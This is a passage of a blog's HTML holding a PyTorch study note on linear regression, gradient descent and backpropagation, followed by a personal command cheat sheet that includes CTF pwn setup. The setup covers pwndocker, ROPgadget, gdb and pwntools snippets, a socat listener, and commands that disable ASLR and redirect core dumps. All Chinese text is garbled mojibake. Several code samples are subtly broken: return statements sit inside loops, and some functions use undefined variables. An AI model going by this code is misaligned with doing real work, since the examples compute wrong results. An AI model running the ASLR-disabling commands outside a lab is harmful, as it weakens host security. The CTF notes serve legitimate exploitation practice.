<h2 id="çº¿æ€§æ¨¡å‹"><a href="#çº¿æ€§æ¨¡å‹" class="headerlink" title="çº¿æ€§æ¨¡å‹"></a>çº¿æ€§æ¨¡å‹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">x_data = [1.0, 2.0, 3.0]</span><br><span class="line">y_data = [2.0, 4.0, 6.0]</span><br><span class="line"></span><br><span class="line">def forward(x):</span><br><span class="line">    return x*w</span><br><span class="line">#çº¿æ€§å…³ç³»</span><br><span class="line"></span><br><span class="line">def loss(x, y):</span><br><span class="line">#æŸå¤±å‡½æ•°</span><br><span class="line">    y_pred = forward(x)</span><br><span class="line">    return (y_pred - y) * (y_pred - y)</span><br><span class="line"></span><br><span class="line">w_list = []</span><br><span class="line">mse_list = []</span><br><span class="line"></span><br><span class="line">#éå†æ‰¾w</span><br><span class="line">for w in np.arange(0.0, 4.1, 0.1):</span><br><span class="line">    print(&#x27;w=&#x27;, w)</span><br><span class="line">    l_sum=0</span><br><span class="line">    for x_val,y_val in zip(x_data,y_data):</span><br><span class="line">        y_pred_val = forward(x_val)</span><br><span class="line">        loss_val = loss(x_val,y_val)</span><br><span class="line">        l_sum+=loss_val</span><br><span class="line">        print(&#x27;\t&#x27;,x_val,y_val,y_pred_val,loss_val)</span><br><span class="line">    print(&#x27;MSE=&#x27;,l_sum/3)</span><br><span class="line">    w_list.append(w)</span><br><span class="line">    mse_list.append(l_sum/3)</span><br><span class="line"></span><br><span class="line">plt.plot(w_list,mse_list)</span><br><span class="line">plt.ylabel(&#x27;loss&#x27;)</span><br><span class="line">plt.xlabel(&#x27;w&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä¸€ä¸ªååˆ†ç®€å•çš„æ•°å­¦æ¨¡å‹ï¼Œå‚æ•° b ç”šè‡³è€ƒè™‘ï¼Œå½“ç„¶å¯ä»¥åŠ ä¸Šï¼Œä½†æ˜¯ç®—å‡ºæ¥è‚¯å®šä¹Ÿæ˜¯ 0ã€‚</p>
<h2 id="æ¢¯åº¦ä¸‹é™ç®—æ³•"><a href="#æ¢¯åº¦ä¸‹é™ç®—æ³•" class="headerlink" title="æ¢¯åº¦ä¸‹é™ç®—æ³•"></a>æ¢¯åº¦ä¸‹é™ç®—æ³•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">x_data = [1.0, 2.0, 3.0]</span><br><span class="line">y_data = [2.0, 4.0, 6.0]</span><br><span class="line"></span><br><span class="line">w=1.0</span><br><span class="line">def forward(x):</span><br><span class="line">    return x*w</span><br><span class="line">#çº¿æ€§å…³ç³»</span><br><span class="line"></span><br><span class="line">def cost(xs, ys):</span><br><span class="line">    cost=0</span><br><span class="line">    for x,y in zip(xs,ys):</span><br><span class="line">        y_pred = forward(x)</span><br><span class="line">        cost+=(y_pred - y) ** 2</span><br><span class="line">        return cost/len(xs)</span><br><span class="line"></span><br><span class="line">def gradient(xs, ys):</span><br><span class="line">    grad=0</span><br><span class="line">    for x,y in zip(xs,ys):</span><br><span class="line">        grad+=2*x*(x*w-y)</span><br><span class="line">        return grad/len(xs)</span><br><span class="line">epoch_list = []</span><br><span class="line">cost_list = []</span><br><span class="line">print(&#x27;Predict(before traning)&#x27;,4,forward(4))</span><br><span class="line">#éå†æ‰¾w</span><br><span class="line">for epoch in range(500):</span><br><span class="line">   cost_val=cost(x_data,y_data)</span><br><span class="line">   grad_val=gradient(x_data,y_data)</span><br><span class="line">   w-=0.01*grad_val</span><br><span class="line">   print(&#x27;Eopch:&#x27;,epoch,&#x27;w=&#x27;,w,&#x27;cost=&#x27;,cost_val)</span><br><span class="line">   epoch_list.append(epoch)</span><br><span class="line">   cost_list.append(cost_val)</span><br><span class="line">print(&#x27;Predict(after traning)&#x27;,4,forward(4))</span><br><span class="line"></span><br><span class="line">plt.plot(epoch_list,cost_list)</span><br><span class="line">plt.ylabel(&#x27;cost_val&#x27;)</span><br><span class="line">plt.xlabel(&#x27;epoch&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>æ¢¯åº¦ä¸‹é™ç®—æ³•ï¼Œå–äº†ä¸ªå‡å€¼å¹³å‡æŸå¤±ï¼Œä½†æ˜¯å…¶å®æŒºèœçš„ï¼Œå¦‚æœå­˜åœ¨éç‚¹çš„è¯ï¼Œè¿™ç§ä¸‹é™æ–¹å¼æ‰€ç®—çš„å¯¼æ•°å°±ä¸º 0 äº†ï¼Œ w æ— æ³•è¿­ä»£æ›´æ–°ã€‚è¿™æ—¶å€™éšæœºæ¢¯åº¦ä¸‹é™å°±å‡ºç°äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">x_data = [1.0, 2.0, 3.0]</span><br><span class="line">y_data = [2.0, 4.0, 6.0]</span><br><span class="line"></span><br><span class="line">w=1.0</span><br><span class="line">def forward(x):</span><br><span class="line">    return x*w</span><br><span class="line">#çº¿æ€§å…³ç³»</span><br><span class="line"></span><br><span class="line">def loss(xs, ys):</span><br><span class="line">    y_pred = forward(x)</span><br><span class="line">    return (y_pred - y) ** 2</span><br><span class="line"></span><br><span class="line">def gradient(xs, ys):</span><br><span class="line">    return 2* x * (x * w - y)</span><br><span class="line"></span><br><span class="line">epoch_list = []</span><br><span class="line">loss_list = []</span><br><span class="line">print(&#x27;Predict(before traning)&#x27;,4,forward(4))</span><br><span class="line">#éå†æ‰¾w</span><br><span class="line">for epoch in range(50):</span><br><span class="line">    for x, y in zip(x_data, y_data):</span><br><span class="line">        grad=gradient(x,y)</span><br><span class="line">        w-=0.01*grad</span><br><span class="line">        print(&#x27;\tgrad:&#x27;,x,y,grad)</span><br><span class="line">        l=loss(x,y)</span><br><span class="line">        epoch_list.append(epoch)</span><br><span class="line">        loss_list.append(l)</span><br><span class="line">    print(&#x27;progress:&#x27;,epoch,&#x27;w=&#x27;,w,&#x27;loss=&#x27;,l)</span><br><span class="line"></span><br><span class="line">print(&#x27;Predict(after traning)&#x27;,4,forward(4))</span><br><span class="line"></span><br><span class="line">plt.plot(epoch_list,loss_list)</span><br><span class="line">plt.ylabel(&#x27;loss_list&#x27;)</span><br><span class="line">plt.xlabel(&#x27;epoch&#x27;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªè¿­ä»£é€Ÿåº¦è¶…çº§å¿«ï¼Œè€Œä¸”æå…¶ä¸å¹³æ»‘ã€‚è¿™ä¸ªç®—æ³•ä¼˜ç‚¹å°±æ˜¯èƒ½å¤Ÿé€šè¿‡éƒ¨åˆ†å™ªç‚¹çš„å°å½±å“æ¥åº¦è¿‡ä¸€ä¸ªéç‚¹ã€‚</p>
<h2 id="åå‘ä¼ æ’­"><a href="#åå‘ä¼ æ’­" class="headerlink" title="åå‘ä¼ æ’­"></a>åå‘ä¼ æ’­</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import torch</span><br><span class="line">x_data = [1.0, 2.0, 3.0]</span><br><span class="line">y_data = [2.0, 4.0, 6.0]</span><br><span class="line"></span><br><span class="line">w=torch.Tensor([1.0])</span><br><span class="line">w.requires_grad=True</span><br><span class="line"></span><br><span class="line">def forward(x):</span><br><span class="line">    return x*w</span><br><span class="line">#çº¿æ€§å…³ç³»</span><br><span class="line"></span><br><span class="line">def loss(x, y):</span><br><span class="line">    y_pred = forward(x)</span><br><span class="line">    return (y_pred - y) ** 2</span><br><span class="line"></span><br><span class="line">epoch_list = []</span><br><span class="line">cost_list = []</span><br><span class="line">print(&#x27;Predict(before traning)&#x27;,4,forward(4).item())</span><br><span class="line">#éå†æ‰¾w</span><br><span class="line">for epoch in range(500):</span><br><span class="line">    for x, y in zip(x_data, y_data):</span><br><span class="line">        l=loss(x,y)</span><br><span class="line">        l.backward()</span><br><span class="line">        print(&#x27;\tgrad:&#x27;,x,y,w.grad.item())</span><br><span class="line">        w.data=w.data-0.01*w.grad.data</span><br><span class="line">        w.grad.data.zero_()</span><br><span class="line">    print(&#x27;progress:&#x27;,epoch,l.item())</span><br><span class="line">print(&#x27;Predict(after traning)&#x27;,4,forward(4).item())</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/09/20/2021-09-20-pytorch_sty/" data-id="cuidrkKVr2Ajb1Jj4YnvAPk7w" data-title="PYTORCHå¤§æ³•" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ai/" rel="tag">ai</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2021-07-01-commands" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/07/01/2021-07-01-commands/" class="article-date">
  <time class="dt-published" datetime="2021-06-30T19:18:21.000Z" itemprop="datePublished">2021-07-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/tools/">tools</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/07/01/2021-07-01-commands/">å„ç§å°å‘½ä»¤ï¼ˆé˜²é—å¿˜</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
<h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;just modify something fist time&quot;</span><br><span class="line">git remote add origin remoteurl</span><br><span class="line">git push -u origin master</span><br><span class="line">git remote rm origin</span><br></pre></td></tr></table></figure>
<h1 id="conda"><a href="#conda" class="headerlink" title="conda"></a>conda</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">conda info -e</span><br><span class="line">conda list</span><br><span class="line">conda create -n name what_you_want_to_pip</span><br><span class="line">conda activate name</span><br><span class="line">conda clean -i</span><br><span class="line">conda remove -n name --all</span><br></pre></td></tr></table></figure>
<h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">rm -f $(id) #åˆ é™¤å®¹å™¨</span><br><span class="line">rmi         #åˆ é™¤é•œåƒ</span><br><span class="line">commit $(id) $(é•œåƒå) #æäº¤é•œåƒ</span><br><span class="line">å‚æ•°</span><br><span class="line">-d  #åå°è¿è¡Œ</span><br><span class="line">-v  #å¤–éƒ¨è·¯å¾„:å†…éƒ¨è·¯å¾„</span><br><span class="line">-p  #æ˜ å°„å¤–ç«¯å£:å†…ç«¯å£</span><br><span class="line">-it #åˆ›å»ºä¸€ä¸ªå¯æ¥å—è¾“å…¥çš„ç»ˆç«¯</span><br><span class="line"># linux docker for pwn</span><br><span class="line">docker run -it --rm --name testctf -v $(pwd):/ctf/work \</span><br><span class="line">--privileged --cap-add=SYS_PRTACE skysider/pwndocker sh</span><br><span class="line">    </span><br><span class="line"># windowsï¼ˆbut `chdir` should exec before</span><br><span class="line">docker run -it --rm --name testctf -v $(chdir):/ctf/work \</span><br><span class="line">--privileged --cap-add=all skysider/pwndocker sh</span><br><span class="line">    </span><br><span class="line"># wiki</span><br><span class="line">docker run -d --name=ctf-wiki -p 4100:80 ctfwiki/ctf-wiki</span><br><span class="line"></span><br><span class="line"># jekyll</span><br><span class="line">docker run -it --rm -v $(pwd):/srv/jekyll -p 4000:4000 sh</span><br></pre></td></tr></table></figure>

<h1 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CC = gcc</span><br><span class="line">CFLAGS = -lm -Wall -g</span><br><span class="line"></span><br><span class="line">all: main_max main_min</span><br><span class="line"></span><br><span class="line">main_max: main_max.c foo.o bar.o</span><br><span class="line">	$(CC) $(CFLAGS) main_max.c foo.o bar.o -o main_max</span><br><span class="line"></span><br><span class="line">main_min: main_min.c foo.o bar.o</span><br><span class="line">	$(CC) $(CFLAGS) main_min.c foo.o bar.o -o main_min</span><br><span class="line"></span><br><span class="line">foo.o: foo.c</span><br><span class="line">	$(CC) $(CFLAGS) -c foo.c</span><br><span class="line">	</span><br><span class="line">bar.o: bar.c</span><br><span class="line">	$(CC) $(CFLAGS) -c bar.c</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">	rm *.o main</span><br></pre></td></tr></table></figure>

<h1 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h1><pre><code>ctrl + B
        --&gt; Arrow keys//to chooce the correct panel
        --&gt; Pgup/Pgdn//rolling screen
</code></pre>
<h1 id="python-1"><a href="#python-1" class="headerlink" title="python"></a>python</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import base64# ä¿®æ”¹è¡¨æ˜ å°„</span><br><span class="line">a = &quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbn/+m1234567890&quot;</span><br><span class="line">b = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line">base_fix = &quot;ZXFWtmKgDZCyrmC5B+CiVfsyXUCQVfsyZRFzDU4yX2YCD/F5Ih8=&quot;</span><br><span class="line">table = &#x27;&#x27;.maketrans(a, b)</span><br><span class="line">print(base64.b64decode(base_fix.translate(table)))</span><br><span class="line"></span><br><span class="line">f = open(&quot;Amazon&quot;)</span><br><span class="line">a=f.read()</span><br><span class="line">sp = a.splitlines()</span><br><span class="line">b=[]</span><br><span class="line">for i in sp:</span><br><span class="line">	c = i.split(&quot;\t&quot;)</span><br><span class="line">	b.append(c)</span><br><span class="line">print(len(b))</span><br><span class="line">d = b[0][0]</span><br><span class="line">print(1)</span><br><span class="line">print(1&gt;100)</span><br><span class="line">c=[]</span><br><span class="line">d=[]</span><br><span class="line">for i in b:</span><br><span class="line">	if int(i[0])&lt;100 and int(i[1])&lt;100:</span><br><span class="line">		c.append(i[0]+&quot;\t&quot;+i[1]+&quot;\n&quot;)</span><br><span class="line">f = open(&quot;guo&quot;, &quot;w+&quot;)</span><br><span class="line">for i in c:</span><br><span class="line">	f.write(i)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h1 id="PR-è¿™æ˜¯ä»€ä¹ˆå¥‡æ€ªçš„ä¸œè¥¿"><a href="#PR-è¿™æ˜¯ä»€ä¹ˆå¥‡æ€ªçš„ä¸œè¥¿" class="headerlink" title="PR(è¿™æ˜¯ä»€ä¹ˆå¥‡æ€ªçš„ä¸œè¥¿)"></a>PR(è¿™æ˜¯ä»€ä¹ˆå¥‡æ€ªçš„ä¸œè¥¿)</h1><ul>
<li>å¡ç‚¹æ’ä»¶</li>
<li>å­—å¹•</li>
<li>è½¬åœº</li>
<li>è½¨é“é®ç½©</li>
</ul>
<h1 id="Pwndocker"><a href="#Pwndocker" class="headerlink" title="Pwndocker"></a>Pwndocker</h1><p>A docker environment for pwn in ctf based on <strong>phusion&#x2F;baseimage:master-amd64</strong>, which is a modified ubuntu 18.04 baseimage for docker</p>
<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><pre><code>docker run -d \
	--rm \
	-h ${ctf_name} \
	--name ${ctf_name} \
	-v $(pwd)/${ctf_name}:/ctf/work \
	-p 23946:23946 \
	--cap-add=SYS_PTRACE \
	skysider/pwndocker

docker exec -it ${ctf_name} /bin/bash
</code></pre>
<h3 id="included-software"><a href="#included-software" class="headerlink" title="included software"></a>included software</h3><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Gallopsled/pwntools">pwntools</a>  â€”â€” CTF framework and exploit development library</li>
<li><a target="_blank" rel="noopener" href="https://github.com/pwndbg/pwndbg">pwndbg</a>  â€”â€” a GDB plug-in that makes debugging with GDB suck less, with a focus on features needed by low-level software developers, hardware hackers, reverse-engineers and exploit developers</li>
<li><a target="_blank" rel="noopener" href="https://github.com/scwuaptx/Pwngdb">pwngdb</a> â€”â€” gdb for pwn</li>
<li><a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>  â€”â€” facilitate ROP exploitation tool</li>
<li><a target="_blank" rel="noopener" href="https://github.com/inaz2/roputils">roputils</a> 	â€”â€” A Return-oriented Programming toolkit</li>
<li><a target="_blank" rel="noopener" href="https://github.com/david942j/one_gadget">one_gadget</a> â€”â€” A searching one-gadget of execve(â€˜&#x2F;bin&#x2F;shâ€™, NULL, NULL) tool for amd64 and i386</li>
<li><a target="_blank" rel="noopener" href="https://github.com/angr/angr">angr</a>   â€”â€”  A platform-agnostic binary analysis framework</li>
<li><a target="_blank" rel="noopener" href="https://github.com/radare/radare2">radare2</a> â€”â€”  A rewrite from scratch of radare in order to provide a set of libraries and tools to work with binary files</li>
<li><a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">seccomp-tools</a> â€”â€” Provide powerful tools for seccomp analysis</li>
<li>linux_server[64] 	â€”â€” IDA 7.0 debug server for linux</li>
<li><a target="_blank" rel="noopener" href="https://tmux.github.io/">tmux</a> 	â€”â€” a terminal multiplexer</li>
<li><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/ltrace">ltrace</a>      â€”â€” trace library function call</li>
<li><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/strace">strace</a>     â€”â€” trace system call</li>
</ul>
<h3 id="included-glibc"><a href="#included-glibc" class="headerlink" title="included glibc"></a>included glibc</h3><p>Default compiled glibc path is <code>/glibc</code>.</p>
<ul>
<li>2.19  â€”â€” ubuntu 12.04 default libc version</li>
<li>2.23  â€”â€” ubuntu 16.04 default libc version</li>
<li>2.24  â€”â€” introduce vtable check in file struct</li>
<li>2.27  â€”â€” pwndocker default glibc version</li>
<li>2.28  â€”â€” new libc version</li>
<li>2.29  â€”â€” latest libc version</li>
</ul>
<h4 id="How-to-run-in-custom-libc-version"><a href="#How-to-run-in-custom-libc-version" class="headerlink" title="How to run in custom libc version?"></a>How to run in custom libc version?</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.so</span><br><span class="line">patchelf --set-interpreter /tmp/ld-2.27.so ./test</span><br><span class="line">LD_PRELOAD=./libc.so.6 ./test</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process([<span class="string">&quot;/path/to/ld.so&quot;</span>, <span class="string">&quot;./test&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/path/to/libc.so.6&quot;</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>strange</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space//whether open aslr or not  </span><br><span class="line">ulimit -c unlimited//æŒ‡ç¤ºç¨‹åºæ¯å½“å‡ºç°é”™è¯¯æ—¶ä¼šç”Ÿæˆè½¬å‚¨æ–‡ä»¶</span><br><span class="line">echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern//save to tmp directory</span><br><span class="line">gdb $file_name core.%t//debug core file</span><br><span class="line">socat TCP4-LISTEN:8888,fork EXEC:./a.out</span><br><span class="line">nm -D some.so</span><br><span class="line">objdump -tT  some.so</span><br><span class="line">#dumpå‡ºsoå„å‡½æ•°åœ°å€</span><br><span class="line">objdump -d -j .plt file_name</span><br><span class="line">#æ˜¾ç¤ºpltè¡¨</span><br><span class="line">objdump -R file_name</span><br><span class="line">#æ˜¾ç¤ºgotè¡¨</span><br></pre></td></tr></table></figure>
<p>gdb </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">p (*(struct _IO_FILE_plus *) addr)</span><br><span class="line">fpchain</span><br><span class="line">telescope addr num</span><br><span class="line">elfsymbol</span><br><span class="line">vmmap</span><br><span class="line">readelf</span><br><span class="line">find string</span><br><span class="line">record</span><br><span class="line">x/wx addr</span><br><span class="line">find addr,offset,string</span><br><span class="line">print function</span><br><span class="line">#gdbæ˜¾ç¤ºä¸€äº›addrå­˜æ”¾çš„å€¼ï¼Œç‚’é¸¡å¥½ç”¨</span><br><span class="line">- wå¯æ¢ä½b/h/gï¼Œåˆ†åˆ«å–1/2/8å­—èŠ‚</span><br><span class="line">- /åå¯ä»¥æ¥æ•°å­—ï¼Œè¡¨ç¤ºæ˜¾ç¤ºå¤šå°‘</span><br><span class="line">- ç¬¬äºŒä¸ªxå¯ä»¥æ¢æˆuï¼ˆunsinged intï¼‰/dï¼ˆ10è¿›åˆ¶æ•°ï¼‰/sï¼ˆå­—ç¬¦ä¸²ï¼‰/iï¼ˆæŒ‡ä»¤ï¼‰</span><br><span class="line">set *addr=value</span><br><span class="line">- è®¾ç½®addrå€¼ï¼Œé»˜è®¤ä¸º4å­—èŠ‚</span><br><span class="line">- ä¹Ÿå¯ä»¥å°†*æ¢ä½&#123;char/short/long&#125;åˆ†åˆ«è®¾ç½®1/2/8å­—èŠ‚</span><br></pre></td></tr></table></figure>
<p>pwntools</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">p = process([&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;, &quot;./pwn&quot;\</span><br><span class="line">], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.23/64/lib/libc.so.6&quot;&#125;)</span><br><span class="line"></span><br><span class="line">def debug(addr,PIE=True):</span><br><span class="line">if PIE:</span><br><span class="line">    text_base = int(os.popen(&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;.format(p.pid)).readlines()[1], 16)</span><br><span class="line">    gdb.attach(p,&#x27;b *&#123;&#125;&#x27;.format(hex(text_base+addr)))</span><br><span class="line">else:</span><br><span class="line">    gdb.attach(p,&quot;b *&#123;&#125;&quot;.format(hex(addr)))</span><br></pre></td></tr></table></figure>
<p>ROPgadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --ropchain</span><br><span class="line">ROPgadget --binary easy_pwn --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/07/01/2021-07-01-commands/" data-id="cuidDk-HdsYR4WwhOt4_Fqa1m" data-title="å„ç§å°å‘½ä»¤ï¼ˆé˜²é—å¿˜" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2021-01-13-fuzz_note" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
